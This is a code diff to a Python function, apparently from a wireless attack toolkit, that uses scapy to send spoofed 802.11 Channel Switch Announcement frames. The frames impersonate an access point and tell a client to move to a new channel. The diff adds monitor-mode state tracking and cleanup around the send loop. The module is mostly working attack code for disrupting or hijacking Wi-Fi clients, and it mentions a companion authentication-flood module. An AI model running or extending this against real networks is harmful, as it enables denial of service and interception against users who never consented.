@@ -19,7 +19,7 @@ import time
 from scapy.config import conf
 
 from ..frames import BROADCAST, craft_csa_action
-from ..radio import ensure_channel, ensure_monitor_mode, get_mode
+from ..radio import ensure_channel, ensure_monitor_mode, get_mode, set_monitor_active
 
 
 def send_csa(
@@ -66,30 +66,34 @@ def send_csa(
         return 0
 
     pkt = craft_csa_action(bssid=bssid, client=client, new_channel=new_channel)
+    set_monitor_active(iface, True)
     try:
-        sock = conf.L2socket(iface=iface)
-    except OSError as exc:
-        log(f"CSA socket open failed: {exc}")
-        return 0
+        try:
+            sock = conf.L2socket(iface=iface)
+        except OSError as exc:
+            log(f"CSA socket open failed: {exc}")
+            return 0
 
-    sent = 0
-    try:
-        for i in range(count):
-            if stop_event is not None and stop_event.is_set():
-                log(f"CSA spoof stopped after {sent} frame(s) -- stop requested")
-                return sent
-            try:
-                sock.send(pkt)
-                sent += 1
-            except OSError as exc:
-                log(f"CSA send failed after {sent} frame(s): {exc}")
-                return sent
-            log(f"CSA frame {i + 1}/{count} sent: {bssid} -> {client}, switch to channel {new_channel}")
-            # Unconditional sleep(interval), even at 0.0 -- see
-            # auth_flood.py's note: a real syscall forces a GIL yield every
-            # frame, which a falsy-guarded skip would not.
-            if i < count - 1:
-                time.sleep(interval)
+        sent = 0
+        try:
+            for i in range(count):
+                if stop_event is not None and stop_event.is_set():
+                    log(f"CSA spoof stopped after {sent} frame(s) -- stop requested")
+                    return sent
+                try:
+                    sock.send(pkt)
+                    sent += 1
+                except OSError as exc:
+                    log(f"CSA send failed after {sent} frame(s): {exc}")
+                    return sent
+                log(f"CSA frame {i + 1}/{count} sent: {bssid} -> {client}, switch to channel {new_channel}")
+                # Unconditional sleep(interval), even at 0.0 -- see
+                # auth_flood.py's note: a real syscall forces a GIL yield every
+                # frame, which a falsy-guarded skip would not.
+                if i < count - 1:
+                    time.sleep(interval)
+        finally:
+            sock.close()
+        return sent
     finally:
-        sock.close()
-    return sent
+        set_monitor_active(iface, False)
